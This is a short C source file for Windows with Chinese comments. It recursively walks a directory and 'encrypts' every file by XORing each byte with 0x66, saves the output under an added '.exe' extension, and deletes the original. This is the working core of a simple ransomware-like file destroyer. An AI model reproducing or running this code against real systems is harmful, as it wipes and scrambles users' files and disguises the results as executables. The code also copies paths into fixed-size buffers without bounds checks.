#include"funcs.h"
#include<stdio.h>
#include<windows.h>

void findFile(char* pathName) {
	char currFile[MAX_PATH]; // 暂时存储每个文件名
	memset(currFile, 0, MAX_PATH);
	sprintf(currFile, "%s\\*.*", pathName);
	_WIN32_FIND_DATAA findData;
	HANDLE hFile = FindFirstFile(currFile, &findData);
	if (hFile == INVALID_HANDLE_VALUE)
		return;

	int ret = 0;
	while (1) {
		memset(currFile, 0, MAX_PATH);
		sprintf(currFile, "%s\\%s", pathName, findData.cFileName);
		// 检查文件属性--文件还是文件夹？
		if (findData.cFileName[0] == '.'); //对特殊文件夹不进行处理
		else if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))  //如果是普通文件夹，递归调用findFile函数
			findFile(currFile);
		else //否则，处理当前文件
			enCode(currFile);
		
		ret = FindNextFile(hFile, &findData);
		if (!ret)
			break;
	}
}

void enCode(char* pathFile) {
	//打开待加密文件，创建加密后文件
	FILE* fpSrc = fopen(pathFile, "rb"); //只读字节流
	char buff[MAX_PATH];
	sprintf(buff, "%s.exe", pathFile);
	FILE* fpDst = fopen(buff, "wb"); //只写字节流
	
	if (fpSrc == NULL || fpDst == NULL)
		return;
	//以单个字节循环读取待加密文件内容，并写入加密文件中
	char currByte;
	while (1) {
		int count = fread(&currByte, 1, 1, fpSrc);
		if (count < 1) //没读到
			break;
		currByte ^= 0x66; //简单异或加密法
		fwrite(&currByte, 1, 1, fpDst); //写入加密文件
	}
	fclose(fpSrc);
	fclose(fpDst);
	remove(pathFile); //删除原文件
}
